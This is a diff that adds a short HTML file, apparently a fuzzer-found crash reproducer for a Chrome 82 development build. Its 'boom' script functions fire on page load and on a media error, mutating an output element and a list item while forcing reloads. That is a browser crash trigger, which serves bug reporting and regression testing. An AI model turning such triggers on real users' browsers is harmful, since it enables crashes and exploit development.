@@ -1,0 +1,26 @@
+<!-- tested on Google Chrome 82.0.4062.3 dev (64bit)-->
+<html>
+<head>
+<script>
+function boom1() {
+var fuzz2 = document.getElementById("fuzz2");
+try { fuzz2.defaultValue = "fuzz1"; } catch(e) {}
+location.reload(true); //sometimes it requires multiple reloads
+}
+
+
+function boom2() {
+var fuzz3 = document.getElementById("fuzz3");
+try { fuzz3.setAttribute("size", "0"); } catch(e) {}
+}
+</script>
+</head>
+<body onload=boom1()>
+<video>
+<source onerror="boom2()" src=x></source>
+</video>
+<li id="fuzz3">
+</li>
+<output id="fuzz2">AAAAAAAAAAAAAAAAAAA</output>
+</body>
+</html>
